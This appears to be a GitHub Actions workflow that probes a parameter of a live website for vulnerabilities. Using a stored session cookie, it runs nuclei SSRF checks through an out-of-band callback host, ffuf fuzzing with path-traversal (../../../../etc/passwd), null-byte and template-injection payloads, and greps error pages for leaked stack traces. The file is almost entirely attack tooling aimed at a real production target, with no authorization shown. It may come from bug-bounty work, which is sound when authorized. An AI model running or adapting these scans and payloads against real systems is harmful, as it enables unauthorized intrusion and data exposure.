name: "Heavy-Duty Crash Escalation ‚Äî amp Parameter"

on:
  workflow_dispatch:

permissions:
  contents: write
  issues: write

env:
  TARGET_URL: "https://academy.openai.com/?amp=test"
  # Base URL for the parameter we're attacking
  FUZZ_BASE: "https://academy.openai.com/?amp="

jobs:
  escalate_500:
    runs-on: ubuntu-latest
    steps:
      - name: Setup Advanced Tools
        run: |
          go install github.com/ffuf/ffuf/v2@latest
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH

      - name: üß™ Test 1:Session Isolation (Auth vs No-Auth)
        run: |
          # Check if the 500 happens without a cookie (Server-wide vs User-specific)
          curl -s -o- -I "${{ env.TARGET_URL }}" > auth_test_no_cookie.txt
          curl -s -o- -I "${{ env.TARGET_URL }}" -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > auth_test_with_cookie.txt

      - name: üõ°Ô∏è Test 2:SSRF & OAST Escalation
        run: |
          # If 'amp' is trying to fetch a page, this will trigger a hit on interact.sh
          # This is a common way to turn a 500 error into a Critical SSRF
          nuclei -u "${{ env.FUZZ_BASE }}http://{{interactsh-url}}" \
            -t http/vulnerabilities/generic/ssrf-fuzz.yaml \
            -interactsh-server oast.fun \
            -o ssrf_results.txt || true

      - name: ‚ò¢Ô∏è Test 3:Language-Specific Crash (Python/JS/Go)
        run: |
          # Using FFuF to send payloads that break specific backends
          # Including: Null bytes, Template Injection, and Path Traversal
          cat <<EOF > payloads.txt
          %00
          ../../../../etc/passwd
          {{7*7}}
          \${7*7}
          [object%20Object]
          undefined
          NaN
          true
          false
          -1
          99999999999999999999
          EOF
          
          ffuf -u "${{ env.FUZZ_BASE }}FUZZ" \
               -w payloads.txt \
               -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" \
               -mc 500 -o crash_matrix.json

      - name: üìä Test 4:Information Leakage Check
        run: |
          # Specifically look for "Stack Traces" in the 500 response body
          curl -s "${{ env.TARGET_URL }}" -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > full_error.html
          grep -iE "at |line |file |stack|exception|debug|trace|vendor|node_modules" full_error.html > leaked_info.txt || true

      - name: üö® High-Impact Report
        if: always()
        run: |
          # Analyze if any payload changed the size of the 500 error
          # A larger 500 error often means a stack trace was returned!
          if [ -s leaked_info.txt ] || [ -s ssrf_results.txt ]; then
             REPORT="### üö® CRITICAL DATA LEAKED\n"
             [ -s leaked_info.txt ] && REPORT+="\n#### Potential Stack Trace Found:\n\`\`\`\n$(cat leaked_info.txt | head -n 10)\n\`\`\`"
             [ -s ssrf_results.txt ] && REPORT+="\n#### SSRF Triggered:\n$(cat ssrf_results.txt)"
             
             curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
               -H "Content-Type: application/json" \
               https://api.github.com/repos/${{ github.repository }}/issues \
               -d "{\"title\":\"üö® POTENTIAL EXPLOIT: amp 500 Escalation\",\"body\":\"$REPORT\"}"
          fi
          
